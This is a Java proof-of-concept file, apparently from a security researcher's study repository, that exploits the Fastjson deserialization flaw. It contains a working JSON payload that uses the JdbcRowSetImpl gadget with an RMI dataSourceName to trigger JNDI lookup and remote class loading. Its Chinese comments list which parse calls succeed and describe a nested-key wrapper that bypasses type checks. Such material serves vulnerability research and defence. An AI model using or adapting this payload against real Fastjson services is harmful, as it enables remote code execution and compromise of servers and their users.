package com.SugarP1g.deserialization.Fastjson;

import com.alibaba.fastjson.JSON;

public class POCWithJdbcRowSetImpl {

    public static void main(String[] args) {
        String payload = "{\"rand1\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/HelloRMIInterface\",\"autoCommit\":true}}";
        JSON.parse(payload);  // 执行成功
        //JSON.parseObject(payload); 成功
        //JSON.parseObject(payload,Object.class); 成功
        //JSON.parseObject(payload, User.class); 成功，没有直接在外层用@type，加了一层rand:{}这样的格式，还没到类型匹配就能成功触发，这是在xray的一篇文中看到的https://zhuanlan.zhihu.com/p/99075925，所以后面的payload都使用这种模式
    }
}
